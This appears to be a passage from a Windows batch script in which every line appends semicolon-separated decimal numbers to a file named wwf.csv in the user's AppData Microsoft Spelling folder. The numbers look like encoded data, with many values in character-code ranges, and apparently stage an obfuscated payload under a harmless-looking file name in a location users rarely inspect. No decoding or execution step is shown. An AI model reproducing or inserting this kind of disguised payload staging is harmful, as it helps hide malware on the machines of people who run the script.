>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(82.9513;698.134;895.29;799.54;3995.851;134.923;218.943;248.9548;942.22;861.154;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(639.225;9147.905;165.851;208.938;93.7207;399.65;927.91;57.156;2878.835;62.76;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(119.66;209.9927;66.177;817.31;320.190;4007.597;97.881;240.920;198.1620;527.4;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(890.223;565.199;6395.414;40.938;222.801;47.0417;936.151;946.161;692.150;7366.916;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.914;161.470;189.4599;489.243;851.165;39.75;9287.572;16.853;128.431;208.5078;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(50.41;897.177;855.165;2548.663;69.819;30.353;198.8386;910.162;862.159;822.122;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(9704.334;250.672;149.631;171.7089;951.71;435.128;945.158;8178.948;191.807;183.675;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(151.9987;926.235;817.120;626.236;1325.934;55.853;121.724;75.1399;955.214;879.35;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(804.117;5312.930;175.950;252.839;235.4323;411.128;934.105;559.175;7657.952;48.937;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(4.776;142.0131;923.223;817.109;799.145;1394.561;209.857;86.678;79.0144;891.128;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(587.34;861.120;4223.517;50.533;122.939;65.6497;710.177;363.251;868.204;3393.864;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(93.893;161.836;155.5161;687.113;586.78;372.69;4854.892;66.901;155.818;91.8647;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(610.128;472.107;953.121;1979.859;193.889;109.809;106.7473;901.82;815.19;313.122;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(8459.480;205.549;130.621;186.5885;348.130;321.182;32.1;6767.71;48.829;149.648;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(126.1992;749.11;548.9;66.3;8820.485;4.66;19.32;85.6494;783.49;519.48;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(617.6;2371.63;85.74;8.619;10.9160;687.97;815.104;805.110;3915.803;116.811;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(110.349;16.3951;748.14;36.3;685.4;0019.57;19.67;82.801;100.9117;809.111;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(810.100;649.30;3396.348;28.46;3.585;4.5113;510.19;421.77;805.99;9741.814;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(111.815;111.802;116.8706;732.67;811.114;812.111;5156.814;97.816;105.811;110.2591;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(349.40;548.38;46.3;8969.385;4.43;19.731;77.2104;805.99;814.111;815.111;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(9053.802;116.632;67.811;100.4181;801.32;783.105;803.110;8560.805;110.803;32.780;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(67.5244;765.32;650.48;749.49;4189.52;19.451;0.60;1.0196;381.158;841.143;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(464.113;2519.863;14.565;0.70;0.4363;60.1;481.48;713.6;6475.59;96.834;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(72.61;101.6482;43.4;42.1;45.0;3566.860;130.51;12.548;17.6970;56.10;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(742.134;772.134;8097.947;13.31;9.425;4.5732;749.3;32.1;41.48;9307.325;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6.49;42.834;72.2385;834.247;513.1;69.3;6840.549;12.56;10.643;6.9288;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(31.4;71.130;755.2;3915.41;4.348;28.46;10.2498;743.6;61.4;41.130;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(2649.355;2.41;11.449;14.1136;748.12;76.10;343.6;0682.51;4.51;130.355;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(2.7118;31.21;648.47;56.9;6423.442;134.472;134.947;13.7875;51.9;34.49;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(434.4;7350.632;95.875;4.536;24.0535;947.242;803.147;413.74;5144.573;203.766;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(32.735;253.3684;860.83;327.123;821.4;6765.662;27.485;211.836;22.0666;392.4;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(953.48;829.140;8104.66;10.743;6.51;4.7227;71.130;555.2;31.12;2207.549;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(126.348;124.860;94.4295;828.92;40.77;40.105;7103.60;99.40;114.70;111.1916;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(60.115;40.111;30.102;4510.60;116.30;32.30;87.6152;70.105;40.110;30.100;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(3785.40;111.60;119.30;115.2430;40.32;50.87;50.111;3094.70;114.30;107.50;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(102.7845;60.108;50.111;30.119;5089.40;32.70;70.30;111.9324;30.117;60.110;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(30.100;2505.30;97.30;116.30;105.8475;40.111;50.110;40.32;1668.60;67.40;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(111.60;109.0198;50.112;50.105;30.108;8982.70;101.60;114.861;26.5428;828.24;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(804.116;816.112;1140.658;47.447;119.819;119.1835;646.109;805.99;814.111;1680.815;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(111.802;116.446;99.5887;811.109;748.13;46.9;4309.742;134.572;134.947;13.8445;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(31.1;41.5;60.4;6326.830;1.30;88.677;11.0014;899.212;472.46;557.87;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(9371.696;244.914;191.468;98.7966;881.224;783.9;873.28;4623.842;82.677;46.800;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(180.6525;451.78;750.96;462.98;4080.481;53.872;142.814;94.5926;940.69;923.202;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(835.106;4344.834;182.830;202.861;228.9115;842.117;842.161;47.254;5049.398;224.878;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(226.748;227.1200;880.246;741.241;860.13;3090.635;92.723;195.378;56.6953;905.32;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(897.163;541.173;3591.905;230.907;16.816;87.3057;955.130;822.99;901.14;1529.884;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(161.770;47.67;6.5732;807.98;915.168;782.134;1438.345;39.523;146.561;185.0685;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(911.65;896.101;953.70;6428.898;28.952;48.879;239.2688;941.50;928.199;913.169;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0139.911;175.887;101.808;149.3203;804.169;36.40;876.143;5913.803;213.785;101.412;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(53.1432;828.29;887.251;841.82;9407.894;247.955;36.756;137.1971;512.155;41.87;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(597.1;7125.914;138.952;184.818;156.1267;888.180;950.49;611.13;1882.849;13.373;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(49.943;156.8124;893.166;906.233;445.158;0514.863;187.923;126.397;210.5774;876.248;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(855.246;873.141;7413.954;223.619;139.725;206.9430;468.204;893.69;866.110;8161.656;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(75.666;217.874;81.9877;784.125;60.183;637.77;8107.928;250.946;139.923;255.4379;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(741.28;728.90;515.29;8311.950;36.822;173.76;132.3760;516.176;887.104;877.139;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1529.909;173.808;56.919;51.2174;934.161;830.18;929.48;1725.830;18.925;6.510;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(43.2635;76.1;54.1;830.55;8234.33;3.31;49.830;18.6090;909.48;830.18;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(905.6;1913.69;42.834;72.834;247.2334;413.1;47.2;860.130;3514.718;190.748;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(130.418;186.5422;52.1;43.49;315.48;2817.413;6.49;96.834;72.8427;41.101;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(33.4;52.1;5018.45;0.548;130.71;81.6399;56.11;642.134;672.134;6452.947;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(13.41;9.316;1.8419;54.160;830.1;464.4;9585.830;1.460;48.830;1.4420;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(356.2;31.1;36.10;5162.343;6.31;4.51;132.1173;389.10;33.1;748.49;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(4788.448;13.76;9.696;134.3622;572.1;801.3;44.2;8252.31;5.30;4.532;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(104.5407;564.197;713.73;871.254;4746.561;164.887;164.934;78.9413;934.155;474.191;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(897.50;5045.518;162.853;210.908;141.4213;789.170;825.49;692.3;7851.718;2.36;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(92.903;35.0601;872.103;883.24;419.50;9552.648;49.457;48.455;50.1941;453.48;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(750.52;355.51;7477.448;46.454;52.357;90.0345;748.4;828.2;41.244;0548.860;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(129.908;164.829;205.5665;448.129;902.49;711.48;4314.69;6.73;85.54;6.9476;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(419.2;385.83;449.11;4942.748;9.76;3.385;4.4850;48.19;32.87;465.49;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(7655.616;48.614;6.53;85.2894;74.7;519.7;482.101;7654.800;109.811;110.800;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(49.0121;530.48;528.6;43.85;8601.54;10.519;21.377;105.0368;399.114;811.115;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(811.102;9312.816;32.767;111.814;112.2727;811.114;597.116;805.111;1825.810;49.545;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(48.343;6.5103;63.85;44.11;519.36;8868.777;105.799;114.811;115.5103;811.102;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(816.32;373.114;0028.801;108.797;110.800;32.5240;579.112;801.114;497.116;7604.805;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(111.810;115.632;76.9029;805.109;805.116;801.100;8481.649;38.548;36.66;3.1008;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(385.4;411.19;429.84;3999.804;97.808;101.815;32.1626;784.83;683.32;469.83;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(3500.378;58.348;56.752;50.5304;445.52;366.69;454.45;2728.667;50.757;65.749;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(37.9873;448.35;36.3;685.4;5317.63;19.328;77.805;99.7730;814.111;815.111;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(802.116;1013.632;84.805;109.801;45.2906;683.116;497.109;812.32;1479.815;101.814;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(118.805;99.3945;801.160;830.14;660.48;4001.830;4.941;48.830;3.8202;917.160;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(73.2;41.2;3684.52;19.451;0.30;0.0970;916.26;928.204;463.122;0048.617;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(250.925;0.30;0.0225;40.0;916.48;413.6;7246.79;42.834;72.834;247.8812;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(413.1;71.11;65.0;2745.648;124.749;11.448;9.3051;36.3;685.4;76.19;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(5721.62;85.583;49.619;48.9892;517.6;43.85;74.8;5072.619;10.587;97.815;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(104.8453;805.110;803.116;811.110;0972.649;16.448;14.66;3.5184;385.4;57.19;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(67.82;5198.801;100.809;111.810;100.2568;349.30;548.28;46.3;4028.785;4.510;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(19.521;77.9835;805.99;814.111;815.111;3479.802;116.632;67.811;114.3841;812.111;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(814.97;816.105;4618.811;110.449;38.548;36.8445;66.3;385.4;43.19;2711.429;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(77.805;99.814;111.5717;815.111;802.116;432.84;0566.805;109.801;45.783;116.3585;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(797.109;812.32;380.67;2093.565;32.350;48.449;48.4291;448.30;523.13;649.56;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0013.648;56.350;51.650;48.5862;650.54;453.49;490.23;9955.713;49.457;49.649;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(50.2520;751.50;348.50;354.53;4681.549;90.648;129.902;49.6155;611.48;69.6;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(43.85;6954.44;6.319;2.585;83.9933;649.11;648.9;66.3;5092.685;4.78;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(19.72;87.0671;365.49;416.48;614.6;8302.63;85.44;7.619;7.4052;582.101;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(800.109;811.110;8416.800;49.630;48.428;6.4697;43.85;34.10;419.21;0100.677;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(105.399;114.811;115.7174;811.102;816.32;367.111;9644.814;112.811;114.797;116.4364;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(805.111;810.49;645.48;3318.643;6.53;85.44;11.6123;319.36;477.105;699.114;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1640.811;115.811;102.816;32.2840;773.114;801.108;397.110;8533.800;32.679;112.801;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(114.4717;397.116;805.111;810.115;6772.432;76.805;109.805;116.8406;801.100;349.38;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(448.36;0650.36;3.685;4.611;19.8687;329.84;804.97;808.101;3011.815;32.384;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(83.383;32.9645;369.83;478.58;748.56;1528.352;50.445;52.666;69.0914;354.45;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(567.50;457.65;7169.349;37.348;35.36;3.9311;685.4;53.19;728.77;8964.805;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(99.814;111.815;111.8583;802.116;532.84;805.109;7290.801;45.583;116.397;109.4652;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(812.32;815.101;814.118;2772.805;99.801;48.830;1.0894;334.48;313.6;79.42;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(3105.834;72.834;247.413;1.1538;61.1;65.0;63.130;6769.71;15.70;48.830;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1.0418;510.2;830.1;71.0;2978.848;30.348;228.835;90.0757;945.176;804.184;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(943.48;1954.846;77.782;82.545;117.4696;367.230;649.84;494.36;0141.828;174.926;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(154.834;128.3947;464.121;813.5;831.117;8379.937;116.891;123.637;236.8601;419.218;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(941.38;645.225;5716.832;61.539;92.930;122.9870;643.151;875.158;933.154;3876.633;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(86.563;252.943;2.9732;845.251;713.37;952.5;8793.896;109.884;54.828;207.1212;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(732.237;818.123;682.129;2311.829;5.836;247.825;50.1350;491.52;885.61;66.128;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(4958.78;225.613;62.611;32.2687;839.176;845.20;355.27;0554.915;4.853;23.908;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(168.3048;394.94;889.200;866.218;8807.667;102.834;160.56;89.6295;663.79;817.26;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(720.121;9604.847;57.941;186.597;199.3326;885.205;718.121;544.116;2033.750;188.777;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(14.945;25.6736;901.12;847.13;928.58;5948.317;231.952;204.801;126.8444;892.216;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(381.116;712.117;9337.923;224.747;192.489;4.5687;315.96;816.14;387.87;8703.930;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(54.931;241.76;84.7720;876.15;829.133;808.235;1517.881;71.899;75.949;44.5882;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(905.83;455.187;936.122;0916.383;170.715;186.820;180.0350;912.74;893.205;821.90;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1226.948;96.872;235.655;205.2883;811.152;644.122;804.139;3487.885;138.929;176.813;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(69.7166;877.195;730.211;829.186;3207.834;175.803;93.831;245.7468;820.245;811.34;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(887.213;2611.444;50.945;67.62;3.5274;41.0;71.163;830.1;9579.627;48.830;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1.623;48.2872;329.6;63.85;529.14;2201.44;22.44;20.859;182.1705;686.75;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(530.238;520.213;3957.923;138.818;122.854;131.8030;726.231;844.227;802.228;3420.548;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(31.56;3.785;29.4286;535.4;524.48;622.128;0318.620;213.599;58.392;138.5603;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(649.144;943.67;823.124;8840.670;27.897;51.804;90.4047;833.109;485.48;486.6;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6501.73;85.529;31.44;79.9508;448.77;648.75;860.73;6027.860;71.834;69.804;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(116.2133;816.112;758.47;747.99;4695.814;108.646;109.805;99.2613;814.111;815.111;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(802.116;7390.446;99.811;109.347;112.7878;807.105;747.99;814.108;9679.747;112.814;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(111.800;117.6872;399.116;815.47;577.105;9936.399;84.805;109.783;116.7474;797.80;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(667.65;695.50;0151.448;49.348;45.648;55.3980;345.48;349.46;699.114;8581.808;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(48.690;6.48;43.1274;56.1;35.5;67.1;7839.61;4.378;48.676;48.0720;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(674.6;38.43;66.1;3311.35;5.77;48.32;134.4099;562.104;816.116;812.58;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(7562.647;47.819;119.819;46.7376;809.105;599.114;811.115;0647.811;102.816;46.699;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(111.9946;809.47;812.107;805.47;3506.699;101.814;116.815;47.9362;477.105;699.84;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(805.109;9488.383;116.497;80.367;65.7832;795.50;748.49;548.45;4675.448;55.545;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(48.749;46.4269;399.114;816.48;412.6;4589.73;85.429;19.41;1.4632;955.4;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(62.48;40.48;1798.419;6.53;85.529;37.8667;74.12;548.10;36.8;8794.743;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6.51;5.75;7.0162;33.8;548.13;66.9;3816.642;134.572;134.947;13.6431;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(61.1;311.5;40.3;5463.830;1.51;0.414;82.1924;812.118;922.200;663.32;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6375.881;52.883;187.71;156.2977;922.240;918.59;350.119;5344.824;224.362;82.348;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(119.6990;941.137;426.75;820.230;1750.423;207.930;224.803;226.1542;663.111;892.103;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(933.176;9483.860;217.822;18.937;66.7224;855.127;470.158;862.229;7646.442;187.944;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(220.844;59.7473;314.11;875.159;846.141;5699.546;91.382;233.357;19.8018;848.164;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(543.220;945.100;4234.898;191.369;87.843;250.7900;49.2;929.217;768.148;4167.909;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(222.867;153.428;232.1019;434.97;857.42;511.34;1813.782;132.936;136.534;98.2811;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(574.111;841.216;831.62;9192.745;210.579;201.33;74.9091;885.19;936.246;791.240;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(7979.946;156.860;213.587;236.3085;911.156;875.18;857.19;5101.844;231.849;138.822;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(130.3081;806.246;844.92;638.55;2227.817;157.954;199.889;135.5305;817.50;492.133;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(832.93;5654.906;193.908;143.322;179.5190;663.22;919.28;344.238;8179.834;41.780;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(98.889;122.7272;794.211;814.189;435.98;9359.872;162.62;97.919;187.8648;52.41;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(819.116;937.51;1549.817;134.865;14.684;206.5792;820.177;482.91;802.135;6316.907;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(156.845;48.838;15.1191;841.58;722.18;570.40;6890.925;75.832;255.825;22.2773;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(881.85;894.208;918.188;5080.433;52.904;144.815;213.0409;662.249;415.150;923.226;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0933.554;43.898;131.855;73.5039;578.177;548.130;46.113;1799.548;130.54;89.860;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(3.9326;72.1;72.2;610.97;4927.49;129.542;0.70;0.8863;40.0;72.48;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(413.6;1348.39;42.834;72.834;247.9970;313.1;51.11;65.0;0487.348;129.836;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(49.411;48.3053;49.6;43.85;34.6;1957.619;2.585;83.449;19.2306;348.17;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(46.3;385.4;9751.78;19.410;87.697;115.4813;804.105;810.103;816.111;9223.810;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(49.716;48.714;6.4981;53.85;74.7;419.7;3932.582;101.800;109.811;110.2379;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(800.49;630.48;728.6;5185.53;85.34;10.519;21.5452;677.105;799.114;811.115;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(5271.811;102.816;32.367;111.3830;814.112;811.114;797.116;7888.805;111.810;49.350;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(48.3447;748.6;63.85;34.3;3555.319;41.377;105.599;114.7980;811.115;811.102;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(816.32;9255.482;111.811;116.532;67.0282;801.114;816.105;802.105;4685.399;97.816;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(101.732;65.8012;817.116;804.111;814.105;5468.816;121.632;50.748;49.7855;448.48;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(530.23;713.49;3514.748;48.655;48.449;50.5805;349.51;454.53;753.90;4949.723;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(13.750;53.448;55.9005;748.49;750.49;452.54;5308.753;53.590;48.824;49.6934;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(711.48;59.6;63.85;7116.34;6.619;2.485;83.1352;549.19;348.17;56.3;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6651.485;4.68;19.310;87.1772;397.115;804.105;810.103;2303.816;111.810;49.616;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(48.8839;714.6;53.85;44.7;2227.419;7.382;101.800;109.5825;811.110;800.49;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(530.48;0630.328;6.73;85.64;10.9596;719.21;377.105;799.114;8731.811;115.811;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(102.816;32.8744;667.111;814.112;811.114;0424.397;116.805;111.810;49.4812;438.48;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(636.6;63.85;4536.64;3.719;29.477;105.5560;499.114;811.115;811.102;4298.816;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(32.784;105.809;101.0003;545.83;816.97;809.112;2675.532;80.567;65.532;50.1380;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(648.49;748.48;830.1;7537.634;48.513;6.49;42.2077;834.72;834.247;713.1;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(2783.51;1.75;0.43;130.2981;41.15;40.48;830.1;2717.710;2.830;1.41;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.9124;869.29;613.188;819.17;4554.838;58.532;236.952;19.7890;851.245;950.127;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(805.148;3924.807;116.784;16.913;165.0579;510.0;830.133;951.237;7031.824;104.475;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(44.595;197.2454;895.229;397.194;818.183;7584.462;102.543;91.940;21.9716;383.39;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(34.49;331.65;9296.327;26.849;29.906;9.0214;419.142;824.97;548.89;1330.877;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(48.668;15.941;96.2908;836.132;584.67;612.215;4285.677;184.656;8.879;66.4714;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(921.147;872.214;815.48;9267.487;38.830;163.369;13.7755;908.234;945.71;829.205;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(7658.891;36.396;50.588;96.2213;770.242;688.71;834.50;1032.832;30.816;97.803;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(145.4689;595.129;584.177;907.147;8036.376;146.893;196.866;93.6690;909.97;419.110;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(540.198;9969.526;249.834;128.887;223.3274;397.252;570.193;639.29;8684.636;103.518;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(114.326;33.7947;838.175;375.100;837.80;1746.398;177.693;253.819;31.1999;661.240;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(687.117;872.189;6876.838;66.577;64.481;209.2511;415.156;76.62;803.127;4922.945;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(102.892;3.850;68.0450;826.239;908.75;953.110;5584.929;154.902;177.868;242.5849;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(822.42;510.49;940.218;6528.578;6.845;182.836;8.2889;553.232;820.28;876.233;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(4299.853;205.660;231.747;68.8031;886.167;944.220;800.189;1730.864;1.893;32.39;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(147.1014;820.205;952.188;892.201;8161.668;93.694;22.856;1.8835;65.79;634.77;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(72.3;9830.51;0.71;163.830;1.4811;930.48;830.1;926.48;4165.416;6.49;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(43.76;1.6620;34.1;830.55;521.1;7097.74;3.72;1.30;48.3762;529.6;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(43.85;529.14;9676.64;22.54;20.913;99.3932;558.92;838.49;844.243;6220.767;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(123.824;70.727;197.6553;351.104;790.133;809.85;9280.548;25.76;9.443;6.5667;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(61.4;61.130;555.20;5690.52;4.712;30.510;0.5191;783.0;817.0;598.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(9933.667;0.765;48.511;6.5092;73.85;529.15;64.4;3722.73;2.41;134.448;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(15.5976;46.3;385.29;519.1;1920.41;255.54;5.648;3.2153;71.1;955.48;
